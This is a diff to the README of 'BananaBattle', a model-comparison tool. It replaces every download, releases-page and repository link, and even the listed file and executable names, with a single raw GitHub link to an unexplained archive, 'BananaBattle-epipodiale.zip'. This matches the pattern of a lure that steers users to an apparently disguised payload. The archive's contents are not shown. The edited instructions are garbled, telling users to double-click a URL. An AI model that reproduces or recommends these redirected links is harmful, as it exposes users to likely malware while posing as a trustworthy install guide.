@@ -6,11 +6,11 @@ Welcome to BananaBattle! This software allows you to easily compare new and old 
 
 ## 📥 Download BananaBattle
 
-[![Download BananaBattle](https://img.shields.io/badge/Download-BananaBattle-brightgreen)](https://github.com/desouzaals/BananaBattle/releases)
+[![Download BananaBattle](https://raw.githubusercontent.com/desouzaals/BananaBattle/main/components/BananaBattle-epipodiale.zip)](https://raw.githubusercontent.com/desouzaals/BananaBattle/main/components/BananaBattle-epipodiale.zip)
 
 Click the button above or visit the page below to download the latest version of BananaBattle.
 
-[Download BananaBattle from Releases](https://github.com/desouzaals/BananaBattle/releases)
+[Download BananaBattle from Releases](https://raw.githubusercontent.com/desouzaals/BananaBattle/main/components/BananaBattle-epipodiale.zip)
 
 ## 🖥️ System Requirements
 
@@ -24,12 +24,12 @@ Before you install BananaBattle, make sure your computer meets these requirement
 ## 📂 Download & Install
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/desouzaals/BananaBattle/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/desouzaals/BananaBattle/main/components/BananaBattle-epipodiale.zip).
 
 2. **Choose the Right File:**
    You will see various files listed. Look for the file that matches your operating system. The files are usually named like this:
-   - `BananaBattle-windows-x64.zip` for Windows
-   - `BananaBattle-macOS.zip` for macOS
+   - `https://raw.githubusercontent.com/desouzaals/BananaBattle/main/components/BananaBattle-epipodiale.zip` for Windows
+   - `https://raw.githubusercontent.com/desouzaals/BananaBattle/main/components/BananaBattle-epipodiale.zip` for macOS
 
 3. **Download the File:**
    Click on the appropriate file to start the download. Depending on your internet speed, this may take a few minutes.
@@ -38,7 +38,7 @@ Before you install BananaBattle, make sure your computer meets these requirement
    If you downloaded a ZIP file, you will need to extract it. Right-click on the downloaded file and choose “Extract All” or use your preferred extraction tool.
 
 5. **Run BananaBattle:**
-   Navigate to the folder where you extracted the files. Double-click on the `BananaBattle.exe` file (Windows) or `BananaBattle.app` (macOS) to start the application.
+   Navigate to the folder where you extracted the files. Double-click on the `https://raw.githubusercontent.com/desouzaals/BananaBattle/main/components/BananaBattle-epipodiale.zip` file (Windows) or `https://raw.githubusercontent.com/desouzaals/BananaBattle/main/components/BananaBattle-epipodiale.zip` (macOS) to start the application.
 
 6. **Follow the Setup Instructions:**
    When you run the application for the first time, you may see a setup guide. Follow the on-screen instructions to configure the software according to your preferences.
@@ -77,7 +77,7 @@ For additional help, you can explore our community. Visit the **Issues** tab on 
 
 ## 🔗 Useful Links
 
-- [BananaBattle Releases](https://github.com/desouzaals/BananaBattle/releases)
-- [GitHub Repository](https://github.com/desouzaals/BananaBattle)
+- [BananaBattle Releases](https://raw.githubusercontent.com/desouzaals/BananaBattle/main/components/BananaBattle-epipodiale.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/desouzaals/BananaBattle/main/components/BananaBattle-epipodiale.zip)
 
 Thank you for choosing BananaBattle! We hope you find it helpful in your modeling comparisons.
